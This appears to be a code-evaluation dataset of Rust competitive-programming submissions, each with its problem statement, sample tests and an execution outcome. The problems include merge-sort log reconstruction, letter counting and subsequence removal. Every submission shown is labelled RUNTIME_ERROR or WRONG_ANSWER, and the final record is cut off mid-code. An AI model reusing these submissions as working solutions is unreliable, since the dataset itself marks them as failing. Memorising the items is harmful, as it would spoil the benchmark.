{"difficulty":-1,"lang":"Rust","lang_cluster":"rust","src_uid":"b2ee84d23d73947fa84faaaebfde85c8","submission_id":"eb773825c25dab5b8961a58c59850200","tags":["*special","binary search"],"exec_outcome":"RUNTIME_ERROR","source_code":"use std::*;\r\nuse io::stdin;\r\nuse cmp::Ordering;\r\n\/\/ use process::exit;\r\n\/\/ use fs::File;\r\n\/\/ use io::{BufRead, BufReader};\r\n\r\nfn resolve_pool(\r\n    s: &[bool], mut offset: usize, lhs: Vec<Val>, rhs: Vec<Val>,\r\n    \/\/ f: &mut BufReader<File>,\r\n) -> Result<(Vec<Val>, usize), FailReason> {\r\n    \/\/ let mut line = String::new();\r\n    \/\/ if f.read_line(&mut line).is_err() {\r\n    \/\/     exit(99)\r\n    \/\/ }\r\n    \/\/ let lmr: Vec<usize> = line\r\n    \/\/     .split(' ')\r\n    \/\/     \/\/ .filter_map(|x|\r\n    \/\/     \/\/     if x.contains('\\n') || x.contains('\\r') {\r\n    \/\/     \/\/         None\r\n    \/\/     \/\/     } else {\r\n    \/\/     \/\/         Some(x.parse::<usize>().unwrap())\r\n    \/\/     \/\/     })\r\n    \/\/     .map(|x| {\r\n    \/\/         let x: String = x.chars().take_while(|c| !['\\n', '\\r'].contains(c)).collect();\r\n    \/\/         x.parse::<usize>().unwrap()\r\n    \/\/     })\r\n    \/\/     .collect();\r\n    \/\/ assert_eq!(lmr.len(), 3);\r\n    \/\/ let (l, m, r) = (lmr[0], lmr[1], lmr[2]);\r\n    \/\/ assert_eq!(m - l, lhs.len());\r\n    \/\/ assert_eq!(r - m, rhs.len());\r\n\r\n    \/\/ let init_offset = offset;\r\n    let mut l_ptr: usize = 0;\r\n    let mut r_ptr: usize = 0;\r\n    let mut next_pool = vec![];\r\n    while l_ptr < lhs.len() && r_ptr < rhs.len() {\r\n        \/\/ let l = &mut lhs[l_ptr];\r\n        \/\/ let r = &mut rhs[r_ptr];\r\n        let fst =\r\n            if let Some(&c) = s.get(offset) {\r\n                c\r\n            } else {\r\n                \/\/ dbg!(lhs);\r\n                \/\/ dbg!(rhs);\r\n                \/\/ exit(16);\r\n                return Err(FailReason::NotEnoughMerges);\r\n            };\r\n        if !fst {\r\n            next_pool.push(lhs[l_ptr]);\r\n            \/\/ l.history.get_mut().push(false);\r\n            \/\/ next_pool.push(Val {\r\n            \/\/     val: lhs[l_ptr].val,\r\n            \/\/     history: Cell::new(lhs[l_ptr].history.take()),\r\n            \/\/ });\r\n            l_ptr += 1;\r\n        } else {\r\n            next_pool.push(rhs[r_ptr]);\r\n            \/\/ r.history.get_mut().push(true);\r\n            \/\/ next_pool.push(Val {\r\n            \/\/     val: rhs[r_ptr].val,\r\n            \/\/     history: Cell::new(rhs[r_ptr].history.take()),\r\n            \/\/ });\r\n            r_ptr += 1;\r\n        }\r\n        offset += 1;\r\n    }\r\n    if l_ptr < lhs.len() {\r\n        next_pool.extend(lhs[l_ptr..].iter())\r\n        \/\/ for i in l_ptr..lhs.len() {\r\n        \/\/     lhs[i].history.get_mut().push(false);\r\n        \/\/     next_pool.push(Val {\r\n        \/\/         val: lhs[i].val,\r\n        \/\/         history: Cell::from(lhs[i].history.take()),\r\n        \/\/     })\r\n        \/\/ }\r\n    } else {\r\n        next_pool.extend(rhs[r_ptr..].iter())\r\n        \/\/ for i in r_ptr..rhs.len() {\r\n        \/\/     rhs[i].history.get_mut().push(true);\r\n        \/\/     next_pool.push(Val {\r\n        \/\/         val: rhs[i].val,\r\n        \/\/         history: Cell::from(rhs[i].history.take()),\r\n        \/\/     })\r\n        \/\/ }\r\n    }\r\n    \/\/ let adv = offset - init_offset;\r\n    \/\/ let mut line = String::new();\r\n    \/\/ if f.read_line(&mut line).is_err() {\r\n    \/\/     exit(99)\r\n    \/\/ }\r\n    \/\/ let line: String = line.chars().take_while(|c| !['\\n', '\\r'].contains(c)).collect();\r\n    \/\/ let act_adv =\r\n    \/\/     if let Ok(act_adv) = line.parse::<usize>() {\r\n    \/\/         act_adv\r\n    \/\/     } else {\r\n    \/\/         dbg!(line);\r\n    \/\/         exit(98)\r\n    \/\/     };\r\n    \/\/ assert_eq!(adv, act_adv);\r\n\r\n    Ok((next_pool, offset))\r\n}\r\n\r\n#[derive(Debug)]\r\nenum FailReason {\r\n    NotEnoughMerges,\r\n    TooManyMerges,\r\n}\r\n\r\ntype Val = usize;\r\n\r\n\/\/ struct Val {\r\n\/\/     val: usize,\r\n\/\/     history: Cell<Vec<bool>>,\r\n\/\/ }\r\n\r\nfn solve(s: &[bool]) -> Vec<Val> {\r\n    fn solve_with_assumed_size(\r\n        s: &[bool], vals: Vec<Val>,\r\n        \/\/ f: &mut BufReader<File>,\r\n    ) -> Result<Vec<Val>, FailReason> {\r\n        fn rec_resolve(\r\n            mut rg: Vec<Val>,\r\n            s: &[bool], offset: usize,\r\n            \/\/ f: &mut BufReader<File>,\r\n        ) -> Result<(Vec<Val>, usize), FailReason> {\r\n            if rg.len() <= 1 {\r\n                return Ok((rg, offset));\r\n            }\r\n            let lhs_upper = rg.len() >> 1;\r\n            let rhs = rg.drain(lhs_upper..).collect();\r\n            let lhs = rg;\r\n            let res = rec_resolve(lhs, s, offset).unwrap();\r\n            let (left_part_of_pool, offset) = res;\r\n            let res = rec_resolve(rhs, s, offset).unwrap();\r\n            let (right_part_of_pool, offset) = res;\r\n\r\n            Ok(resolve_pool(s, offset, left_part_of_pool, right_part_of_pool)?)\r\n        }\r\n\r\n        \/\/ let merge_count = f64::log2(sz as f64) as usize;\r\n        \/\/ let mut known_relations = vec![vec![None; vals.len()]; vals.len()];\r\n\r\n        let (vals, offset) = rec_resolve(vals, s, 0)?;\r\n        match offset.cmp(&s.len()) {\r\n            Ordering::Less => Err(FailReason::TooManyMerges),\r\n            Ordering::Greater => Err(FailReason::NotEnoughMerges),\r\n\r\n            Ordering::Equal => {\r\n                let mut ans = vec![0; vals.len()];\r\n                for (i, pos) in vals.into_iter().enumerate() {\r\n                    ans[pos] = i + 1;\r\n                }\r\n                Ok(ans)\r\n            }\r\n        }\r\n    }\r\n\r\n    let mut lower_bound = 2;\r\n    let mut upper_bound = 1e5 as usize;\r\n    \/\/ let mut lower_bound = upper_bound;\r\n    let mut vals = Vec::with_capacity(upper_bound);\r\n    for i in 0..upper_bound {\r\n        vals.push(i)\r\n        \/\/ vals.push(Val { val: i, history: Cell::new(vec![]) });\r\n    }\r\n    let mut prev_assumed_size = None;\r\n    loop {\r\n        \/\/ let f = File::open(\"C:\\\\Users\\\\nikol\\\\Documents\\\\Jupyter\\\\log.txt\").unwrap();\r\n        \/\/ let mut f = BufReader::new(f);\r\n        let assumed_size = (|| {\r\n            let assumed_size = lower_bound + (upper_bound - lower_bound) \/ 2;\r\n            if let Some(prev_assumed_size) = prev_assumed_size {\r\n                if assumed_size == prev_assumed_size {\r\n                    return assumed_size + 1;\r\n                }\r\n            }\r\n            assumed_size\r\n        })();\r\n        let mut vals_to_pass = vec![];\r\n        for i in 0..assumed_size {\r\n            vals_to_pass.push(i);\r\n            \/\/ let val = &mut vals[i];\r\n            \/\/ vals_to_pass.push(Val {\r\n            \/\/     val: val.val,\r\n            \/\/     history: Cell::new(val.history.get_mut().clone()),\r\n            \/\/ })\r\n        }\r\n        match solve_with_assumed_size(s, vals_to_pass) {\r\n            Ok(ans) => return ans,\r\n            Err(FailReason::NotEnoughMerges) => {\r\n                upper_bound = assumed_size;\r\n            }\r\n            Err(FailReason::TooManyMerges) => {\r\n                lower_bound = assumed_size;\r\n            }\r\n        }\r\n        prev_assumed_size = Some(assumed_size);\r\n    }\r\n}\r\n\r\nfn main() {\r\n    let mut buffer = String::new();\r\n    stdin().read_line(&mut buffer);\r\n    let buffer = Vec::from(buffer\r\n        .chars()\r\n        .filter_map(|x| {\r\n            match x {\r\n                '0' => Some(false),\r\n                '1' => Some(true),\r\n                _ => None\r\n            }\r\n        })\r\n        .collect::<Vec<bool>>());\r\n    let ans = solve(&buffer);\r\n    println!(\"{}\", ans.len());\r\n    for v in ans {\r\n        print!(\"{} \", v);\r\n    }\r\n}\r\n","description":"\u0420\u0430\u0441\u0441\u043c\u043e\u0442\u0440\u0438\u043c \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0438\u0439 \u043a\u043e\u0434 \u0441\u043e\u0440\u0442\u0438\u0440\u043e\u0432\u043a\u0438 \u0441\u043b\u0438\u044f\u043d\u0438\u0435\u043c \u043d\u0430 \u044f\u0437\u044b\u043a\u0435 Python: def sort(a):  n = len(a)  b = [0 for i in range(n)]  log = []  def mergeSort(l, r):    if r - l <;= 1:      return    m = (l + r) &gt;&gt; 1    mergeSort(l, m)    mergeSort(m, r)    i, j, k = l, m, l    while i <; m and j <; r:      if a[i] <; a[j]:        log.append('0')        b[k] = a[i]        i += 1      else:        log.append('1')        b[k] = a[j]        j += 1      k += 1    while i <; m:      b[k] = a[i]      i += 1      k += 1    while j <; r:      b[k] = a[j]      j += 1      k += 1    for p in range(l, r):      a[p] = b[p]  mergeSort(0, n)  return \"\".join(log)\u041a\u0430\u043a \u043c\u043e\u0436\u043d\u043e \u0437\u0430\u043c\u0435\u0442\u0438\u0442\u044c, \u044d\u0442\u043e\u0442 \u043a\u043e\u0434 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0442 \u043b\u043e\u0433\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435\u00a0\u2014 \u0432\u0430\u0436\u043d\u0435\u0439\u0448\u0438\u0439 \u0438\u043d\u0441\u0442\u0440\u0443\u043c\u0435\u043d\u0442 \u0440\u0430\u0437\u0440\u0430\u0431\u043e\u0442\u043a\u0438.\u0421\u0442\u0430\u0440\u0448\u0438\u0439 \u0440\u0430\u0437\u0440\u0430\u0431\u043e\u0442\u0447\u0438\u043a \u0412\u041a\u043e\u043d\u0442\u0430\u043a\u0442\u0435 \u0412\u0430\u0441\u044f \u0441\u0433\u0435\u043d\u0435\u0440\u0438\u0440\u043e\u0432\u0430\u043b \u043f\u0435\u0440\u0435\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0443 $$$a$$$ (\u043c\u0430\u0441\u0441\u0438\u0432 \u0438\u0437 $$$n$$$ \u0440\u0430\u0437\u043b\u0438\u0447\u043d\u044b\u0445 \u0446\u0435\u043b\u044b\u0445 \u0447\u0438\u0441\u0435\u043b \u043e\u0442 $$$1$$$ \u0434\u043e $$$n$$$), \u0434\u0430\u043b \u0435\u0451 \u043d\u0430 \u0432\u0445\u043e\u0434 \u0444\u0443\u043d\u043a\u0446\u0438\u0438 sort \u0438 \u043f\u043e\u043b\u0443\u0447\u0438\u043b \u043d\u0430 \u0432\u044b\u0445\u043e\u0434\u0435 \u0441\u0442\u0440\u043e\u043a\u0443 $$$s$$$. \u041d\u0430 \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0438\u0439 \u0434\u0435\u043d\u044c \u0441\u0442\u0440\u043e\u043a\u0443 $$$s$$$ \u0412\u0430\u0441\u044f \u043d\u0430\u0448\u0451\u043b, \u0430 \u043f\u0435\u0440\u0435\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 $$$a$$$ \u043f\u043e\u0442\u0435\u0440\u044f\u043b\u0430\u0441\u044c. \u0412\u0430\u0441\u044f \u0445\u043e\u0447\u0435\u0442 \u0432\u043e\u0441\u0441\u0442\u0430\u043d\u043e\u0432\u0438\u0442\u044c \u043b\u044e\u0431\u0443\u044e \u043f\u0435\u0440\u0435\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0443 $$$a$$$ \u0442\u0430\u043a\u0443\u044e, \u0447\u0442\u043e \u0432\u044b\u0437\u043e\u0432 \u0444\u0443\u043d\u043a\u0446\u0438\u0438 sort \u043e\u0442 \u043d\u0435\u0451 \u0434\u0430\u0441\u0442 \u0442\u0443 \u0436\u0435 \u0441\u0442\u0440\u043e\u043a\u0443 $$$s$$$. \u041f\u043e\u043c\u043e\u0433\u0438\u0442\u0435 \u0435\u043c\u0443!","input_from":"\u0441\u0442\u0430\u043d\u0434\u0430\u0440\u0442\u043d\u044b\u0439 \u0432\u0432\u043e\u0434","output_to":"\u0441\u0442\u0430\u043d\u0434\u0430\u0440\u0442\u043d\u044b\u0439 \u0432\u044b\u0432\u043e\u0434","input_spec":"\u0412\u0432\u043e\u0434 \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u043d\u0435\u043f\u0443\u0441\u0442\u0443\u044e \u0441\u0442\u0440\u043e\u043a\u0443 $$$s$$$, \u0441\u043e\u0441\u0442\u043e\u044f\u0449\u0443\u044e \u0438\u0437 \u0441\u0438\u043c\u0432\u043e\u043b\u043e\u0432 0 \u0438 1.  \u0412 \u044d\u0442\u043e\u0439 \u0432\u0435\u0440\u0441\u0438\u0438 \u0437\u0430\u0434\u0430\u0447\u0438 \u0434\u043b\u044f \u043b\u044e\u0431\u043e\u0433\u043e \u0442\u0435\u0441\u0442\u0430 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442 \u043f\u0435\u0440\u0435\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u0434\u043b\u0438\u043d\u044b $$$16$$$, \u0443\u0434\u043e\u0432\u043b\u0435\u0442\u0432\u043e\u0440\u044f\u044e\u0449\u0430\u044f \u0443\u0441\u043b\u043e\u0432\u0438\u044e. \u0422\u0435\u043c \u043d\u0435 \u043c\u0435\u043d\u0435\u0435, \u0432\u0430\u0448 \u043e\u0442\u0432\u0435\u0442 \u043c\u043e\u0436\u0435\u0442 \u0438\u043c\u0435\u0442\u044c \u043b\u044e\u0431\u0443\u044e \u0434\u043b\u0438\u043d\u0443, \u0432 \u0442\u043e\u043c \u0447\u0438\u0441\u043b\u0435 \u043e\u0442\u043b\u0438\u0447\u043d\u0443\u044e \u043e\u0442 $$$16$$$.","output_spec":"\u0412 \u043f\u0435\u0440\u0432\u043e\u0439 \u0441\u0442\u0440\u043e\u043a\u0435 \u0432\u044b\u0432\u0435\u0434\u0438\u0442\u0435 \u0446\u0435\u043b\u043e\u0435 \u0447\u0438\u0441\u043b\u043e $$$n$$$\u00a0\u2014 \u0434\u043b\u0438\u043d\u0443 \u043f\u0435\u0440\u0435\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0438. \u0412\u043e \u0432\u0442\u043e\u0440\u043e\u0439 \u0441\u0442\u0440\u043e\u043a\u0435 \u0432\u044b\u0432\u0435\u0434\u0438\u0442\u0435 $$$n$$$ \u0440\u0430\u0437\u043b\u0438\u0447\u043d\u044b\u0445 \u0446\u0435\u043b\u044b\u0445 \u0447\u0438\u0441\u0435\u043b $$$a_0, a_1, \\ldots, a_{n-1}$$$ ($$$1 \\le a_i \\le n$$$)\u00a0\u2014 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u044b \u043f\u0435\u0440\u0435\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0438. \u0415\u0441\u043b\u0438 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442 \u043d\u0435\u0441\u043a\u043e\u043b\u044c\u043a\u043e \u0432\u0430\u0440\u0438\u0430\u043d\u0442\u043e\u0432 \u043e\u0442\u0432\u0435\u0442\u0430, \u0432\u044b\u0432\u0435\u0434\u0438\u0442\u0435 \u043b\u044e\u0431\u043e\u0439 \u0438\u0437 \u043d\u0438\u0445.","notes":null,"sample_inputs":["00000000000000000000000000000000","11111111111111111111111111111111","101011010001100100011011001111011000011110010"],"sample_outputs":["16\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16","16\n16 15 14 13 12 11 10 9 8 7 6 5 4 3 2 1","16\n13 6 1 7 12 5 4 15 14 16 10 11 3 8 9 2"]}
{"difficulty":1000,"lang":"Rust","lang_cluster":"rust","src_uid":"bd5912fe2c5c37658f28f6b159b39645","submission_id":"re_1501","tags":["implementation","greedy","strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"use std::io;\nuse std::str::FromStr;\n\nuse std::cmp::max;\n\nfn get_line() -> String {\n    let mut input = String::new();\n    io::stdin().read_line(&mut input).unwrap();\n    input\n}\n\nfn get_vec<T>(s: String) -> Vec<T>\n    where T: FromStr,\n          <T as FromStr>::Err: std::fmt::Debug,\n{\n    s.split_whitespace().map(|k| k.parse().unwrap()).collect()\n}\n\nfn main() {\n    let s = get_line();\n    let s = s.trim();\n    let k: u8 = {\n        get_line().trim().parse().unwrap()\n    };\n\n    let ans = if s.len() < k as usize {\n        None\n    } else {\n        let mut is_there = vec![false; 26];\n        for c in s.bytes() {\n            let ind = c - b'a';\n            let ind = ind as usize;\n            is_there[ind] = true;\n        }\n        let cnt = is_there.into_iter().filter(|&p| p == true).count();\n        Some(k - cnt as u8)\n    };\n\n    match ans {\n        Some(ans) => println!(\"{}\", ans),\n        None => println!(\"impossible\"),\n    };\n}\n","description":"Calculate the minimum number of characters you need to change in the string s, so that it contains at least k different letters, or print that it is impossible.String s consists only of lowercase Latin letters, and it is allowed to change characters only to lowercase Latin letters too.","input_from":"standard input","output_to":"standard output","input_spec":"First line of input contains string s, consisting only of lowercase Latin letters (1\u2009\u2264\u2009|s|\u2009\u2264\u20091000, |s| denotes the length of s). Second line of input contains integer k (1\u2009\u2264\u2009k\u2009\u2264\u200926).","output_spec":"Print single line with a minimum number of necessary changes, or the word \u00abimpossible\u00bb (without quotes) if it is impossible.","notes":"NoteIn the first test case string contains 6 different letters, so we don't need to change anything.In the second test case string contains 4 different letters: {'a',\u2009'h',\u2009'o',\u2009'y'}. To get 5 different letters it is necessary to change one occurrence of 'o' to some letter, which doesn't occur in the string, for example, {'b'}.In the third test case, it is impossible to make 7 different letters because the length of the string is 6.","sample_inputs":["yandex\n6","yahoo\n5","google\n7"],"sample_outputs":["0","1","impossible"]}
{"difficulty":1200,"lang":"Rust","lang_cluster":"rust","src_uid":"c3244e952830643938d51ce14f043d7d","submission_id":"re_1351","tags":["strings"],"exec_outcome":"WRONG_ANSWER","source_code":"use std::io::{self, BufRead};\n\nstruct Problem {\n    flags: String,\n    seq1: String,\n    seq2: String,\n}\n\nfn reverse_ascii_str(s: &mut str) {\n    unsafe {\n        let bytes = s.as_bytes_mut();\n        bytes.reverse();\n    }\n}\n\nfn trim_end_mut(s: &mut String) {\n    s.truncate(s.trim_end().len());\n}\n\nfn consecutive_subsequences(s: &str, sub1: &str, sub2: &str) -> bool {\n    if let Some((i, _)) = s.match_indices(sub1).next() {\n        if let Some((j, _)) = s.rmatch_indices(sub2).next() {\n            if i + sub1.len() <= j {\n                return true\n            }\n        }\n    }\n    false\n}\n\nfn parse_problem<B: BufRead>(mut input: B) -> io::Result<Problem> {\n    let mut prob = Problem { flags: String::new(),\n                             seq1: String::new(),\n                             seq2:String::new() };\n    input.read_line(&mut prob.flags)?;\n    input.read_line(&mut prob.seq1)?;\n    input.read_line(&mut prob.seq2)?;\n    trim_end_mut(&mut prob.flags);\n    trim_end_mut(&mut prob.seq1);\n    trim_end_mut(&mut prob.seq2);\n    Ok(prob)\n}\n\n\n\nfn main() -> io::Result<()> {\n    let mut problem = parse_problem(io::stdin().lock())?;\n    let forward_possible = consecutive_subsequences(&mut problem.flags,\n                                                    &mut problem.seq1,\n                                                    &mut problem.seq2);\n    reverse_ascii_str(&mut problem.flags);\n    reverse_ascii_str(&mut problem.seq1);\n    reverse_ascii_str(&mut problem.seq2);\n    let backward_possible = consecutive_subsequences(&mut problem.flags,\n                                                     &mut problem.seq1,\n                                                     &mut problem.seq2);\n    let out = match (forward_possible, backward_possible) {\n        (true, true) => \"both\",\n        (true, false) => \"forward\",\n        (false, true) => \"backward\",\n        (false, false) => \"fantasy\",\n    };\n    println!(\"{}\", out);\n    Ok(())\n}\n","description":"Peter likes to travel by train. He likes it so much that on the train he falls asleep. Once in summer Peter was going by train from city A to city B, and as usual, was sleeping. Then he woke up, started to look through the window and noticed that every railway station has a flag of a particular colour.The boy started to memorize the order of the flags' colours that he had seen. But soon he fell asleep again. Unfortunately, he didn't sleep long, he woke up and went on memorizing the colours. Then he fell asleep again, and that time he slept till the end of the journey.At the station he told his parents about what he was doing, and wrote two sequences of the colours that he had seen before and after his sleep, respectively.Peter's parents know that their son likes to fantasize. They give you the list of the flags' colours at the stations that the train passes sequentially on the way from A to B, and ask you to find out if Peter could see those sequences on the way from A to B, or from B to A. Remember, please, that Peter had two periods of wakefulness.Peter's parents put lowercase Latin letters for colours. The same letter stands for the same colour, different letters \u2014 for different colours.","input_from":"standard input","output_to":"standard output","input_spec":"The input data contains three lines. The first line contains a non-empty string, whose length does not exceed 105, the string consists of lowercase Latin letters \u2014 the flags' colours at the stations on the way from A to B. On the way from B to A the train passes the same stations, but in reverse order.  The second line contains the sequence, written by Peter during the first period of wakefulness. The third line contains the sequence, written during the second period of wakefulness. Both sequences are non-empty, consist of lowercase Latin letters, and the length of each does not exceed 100 letters. Each of the sequences is written in chronological order. ","output_spec":"Output one of the four words without inverted commas:    \u00abforward\u00bb \u2014 if Peter could see such sequences only on the way from A to B;  \u00abbackward\u00bb \u2014 if Peter could see such sequences on the way from B to A;  \u00abboth\u00bb \u2014 if Peter could see such sequences both on the way from A to B, and on the way from B to A;  \u00abfantasy\u00bb \u2014 if Peter could not see such sequences. ","notes":"NoteIt is assumed that the train moves all the time, so one flag cannot be seen twice. There are no flags at stations A and B.","sample_inputs":["atob\na\nb","aaacaaa\naca\naa"],"sample_outputs":["forward","both"]}
{"difficulty":1200,"lang":"Rust","lang_cluster":"rust","src_uid":"cb4dbff31d967c3dab8fe0495eb871dc","submission_id":"re_1515","tags":["dsu","dfs and similar","brute force","graphs"],"exec_outcome":"RUNTIME_ERROR","source_code":"use std::io::Read;\n\nfn input(read_file: bool) -> String {\n    if read_file {\n        let mut file = std::fs::File::open(\"sample.txt\").unwrap();\n        let mut buf = String::new();\n        file.read_to_string(&mut buf).unwrap();\n        buf\n    } else {\n        let mut buf = String::new();\n        std::io::stdin().read_to_string(&mut buf).unwrap();\n        buf.trim_end().to_owned()\n    }\n}\n\nfn solve(ws: &mut std::str::SplitWhitespace) {\n    let n: usize = ws.next().unwrap().parse().unwrap();\n    let xy: Vec<(i32, i32)> = (0..n)\n        .map(|_| {\n            (\n                ws.next().unwrap().parse().unwrap(),\n                ws.next().unwrap().parse().unwrap(),\n            )\n        })\n        .collect();\n\n    let mut ans = 100000;\n    for i in 0..n {\n        let mut s = std::collections::HashSet::new();\n        for j in 0..n {\n            s.insert(xy[j].0);\n        }\n        s.remove(&xy[i].0);\n        ans = ans.min(s.len());\n        s.clear();\n        for j in 0..n {\n            s.insert(xy[j].1);\n        }\n        s.remove(&xy[i].1);\n        ans = ans.min(s.len());\n    }\n    println!(\"{}\", ans);\n}\n\nfn main() {\n    const READ_FROM_FILE: bool = false;\n\n    let s = input(READ_FROM_FILE);\n    let mut ws = s.split_whitespace();\n\n    solve(&mut ws);\n    \/\/ let t = ws.next().unwrap().parse().unwrap();\n    \/\/ for _ in 0..t {}\n}\n","description":"Bajtek is learning to skate on ice. He's a beginner, so his only mode of transportation is pushing off from a snow drift to the north, east, south or west and sliding until he lands in another snow drift. He has noticed that in this way it's impossible to get from some snow drifts to some other by any sequence of moves. He now wants to heap up some additional snow drifts, so that he can get from any snow drift to any other one. He asked you to find the minimal number of snow drifts that need to be created.We assume that Bajtek can only heap up snow drifts at integer coordinates.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of input contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 the number of snow drifts. Each of the following n lines contains two integers xi and yi (1\u2009\u2264\u2009xi,\u2009yi\u2009\u2264\u20091000) \u2014 the coordinates of the i-th snow drift. Note that the north direction coin\u0441ides with the direction of Oy axis, so the east direction coin\u0441ides with the direction of the Ox axis. All snow drift's locations are distinct.","output_spec":"Output the minimal number of snow drifts that need to be created in order for Bajtek to be able to reach any snow drift from any other one.","notes":null,"sample_inputs":["2\n2 1\n1 2","2\n2 1\n4 1"],"sample_outputs":["1","0"]}
{"difficulty":1600,"lang":"Rust","lang_cluster":"rust","src_uid":"0fd33e1bdfd6c91feb3bf00a2461603f","submission_id":"37d8888ae5d3d9f6612d333893ac2a5b","tags":["two pointers","binary search","implementation","greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"use std::io::{stdin, stdout, Write, BufReader, BufRead, Read};\n\nfn gcd(mut a: u64, mut b: u64) -> u64 {\n    while b != 0 {\n        a %= b;\n        let c = a;\n        a = b;\n        b = c;\n    }\n    return a;\n}\n\nfn solve(input: &mut BufRead, output: &mut Write) {\n    let mut input = BufReader::new(input);\n\n    let mut first = String::with_capacity(201);\n    let mut second = String::with_capacity(201);\n\n    input.read_line(&mut first).unwrap();\n    input.read_line(&mut second).unwrap();\n\n    let s = first.trim().as_bytes();\n    let t = second.trim().as_bytes();\n\n    let first = s.iter().position(|&it| it == t[0]).unwrap();\n    let second = s.iter().rev().position(|&it| it == t[t.len() - 1]).unwrap();\n\n    let mut answ = first.max(second);\n\n    let mut pos = vec![first; t.len()];\n    let mut pos_rev = vec![second; t.len()];\n\n\n    let mut prev = first;\n    for i in 0..t.len() {\n        let pos1 = s.iter().skip(prev).position(|&it| it == t[i]).unwrap();\n        prev += pos1;\n        pos[i] = prev;\n        prev += 1;\n    }\n\n    let mut rev = second;\n    for i in (0..t.len()).rev() {\n        let pos1 = s.iter().rev().skip(rev).position(|&it| it == t[i]).unwrap();\n        rev += pos1;\n        pos_rev[i] = rev;\n        rev += 1;\n    }\n\n    for i in 0..t.len() - 1 {\n        answ = answ.max((s.len() - pos_rev[i + 1] - 2) - pos[i])\n    }\n\n    answ = answ.max(s.len() - pos[pos.len() - 1] - 1);\n    answ = answ.max(s.len() - pos_rev[0] - 1);\n\n    writeln!(output, \"{}\", answ).unwrap();\n}\n\nfn main() {\n    let stdin = stdin();\n    let stdout = stdout();\n    solve(&mut stdin.lock(), &mut stdout.lock());\n}\n\n#[cfg(test)]\nmod tests {\n    use std::fs::File;\n    use solve;\n    use std::io::BufReader;\n\n    #[test]\n    fn basic_test() {\n        let mut f = BufReader::new(\"bbaba\nbb\n\".as_bytes());\n        let mut buf: Vec<u8> = Vec::new();\n\n        solve(&mut f, &mut buf);\n\n        let res = String::from_utf8(buf).unwrap();\n        assert_eq!(res, \"3\\n\");\n    }\n\n    #[test]\n    fn basic_test2() {\n        let mut f = BufReader::new(\"baaba\nab\n\".as_bytes());\n        let mut buf: Vec<u8> = Vec::new();\n\n        solve(&mut f, &mut buf);\n\n        let res = String::from_utf8(buf).unwrap();\n        assert_eq!(res, \"2\\n\");\n    }\n\n    #[test]\n    fn basic_test3() {\n        let mut f = BufReader::new(\"abcde\nabcde\n\".as_bytes());\n        let mut buf: Vec<u8> = Vec::new();\n\n        solve(&mut f, &mut buf);\n\n        let res = String::from_utf8(buf).unwrap();\n        assert_eq!(res, \"0\\n\");\n    }\n\n    #[test]\n    fn basic_test4() {\n        let mut f = BufReader::new(\"asdfasdf\nfasd\n\".as_bytes());\n        let mut buf: Vec<u8> = Vec::new();\n\n        solve(&mut f, &mut buf);\n\n        let res = String::from_utf8(buf).unwrap();\n        assert_eq!(res, \"3\\n\");\n    }\n\n\n\n\n}","description":"The only difference between easy and hard versions is the length of the string.You are given a string $$$s$$$ and a string $$$t$$$, both consisting only of lowercase Latin letters. It is guaranteed that $$$t$$$ can be obtained from $$$s$$$ by removing some (possibly, zero) number of characters (not necessary contiguous) from $$$s$$$ without changing order of remaining characters (in other words, it is guaranteed that $$$t$$$ is a subsequence of $$$s$$$).For example, the strings \"test\", \"tst\", \"tt\", \"et\" and \"\" are subsequences of the string \"test\". But the strings \"tset\", \"se\", \"contest\" are not subsequences of the string \"test\".You want to remove some substring (contiguous subsequence) from $$$s$$$ of maximum possible length such that after removing this substring $$$t$$$ will remain a subsequence of $$$s$$$.If you want to remove the substring $$$s[l;r]$$$ then the string $$$s$$$ will be transformed to $$$s_1 s_2 \\dots s_{l-1} s_{r+1} s_{r+2} \\dots s_{|s|-1} s_{|s|}$$$ (where $$$|s|$$$ is the length of $$$s$$$).Your task is to find the maximum possible length of the substring you can remove so that $$$t$$$ is still a subsequence of $$$s$$$.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains one string $$$s$$$ consisting of at least $$$1$$$ and at most $$$200$$$ lowercase Latin letters. The second line of the input contains one string $$$t$$$ consisting of at least $$$1$$$ and at most $$$200$$$ lowercase Latin letters. It is guaranteed that $$$t$$$ is a subsequence of $$$s$$$.","output_spec":"Print one integer \u2014 the maximum possible length of the substring you can remove so that $$$t$$$ is still a subsequence of $$$s$$$.","notes":null,"sample_inputs":["bbaba\nbb","baaba\nab","abcde\nabcde","asdfasdf\nfasd"],"sample_outputs":["3","2","0","3"]}
{"difficulty":2000,"lang":"Rust 2021","lang_cluster":"rust","src_uid":"1244_E","submission_id":"201789655","tags":["binary+search","constructive+algorithms","greedy","sortings","ternary+search","two+pointers"],"exec_outcome":"RUNTIME_ERROR","source_code":"fn main() {\r\n    input!{\r\n        n: usize,\r\n        k: usize,\r\n        mut a: [usize; n],\r\n    };\r\n    a.sort_unstable();\r\n    let sum = a.iter().sum::<usize>();\r\n\r\n    let check = |max: usize| {\r\n        let mut l = 0;\r\n        let (mut lsum, mut rsum) = (0, sum);\r\n        for (r, &x) in a.iter().enumerate() {\r\n            rsum -= x;\r\n            while x - a[l] > max {\r\n                lsum += a[l];\r\n                l += 1;\r\n            }\r\n            let op = if l == 0 { 0 } else { l * (x - max) - lsum } + rsum - (n - 1 - r) * x;\r\n            if op <= k {\r\n                return true;\r\n            }\r\n        }\r\n\r\n        let mut r = n - 1;\r\n        (lsum, rsum) = (sum, 0);\r\n        for (l, &x) in a.iter().enumerate() {\r\n            lsum -= 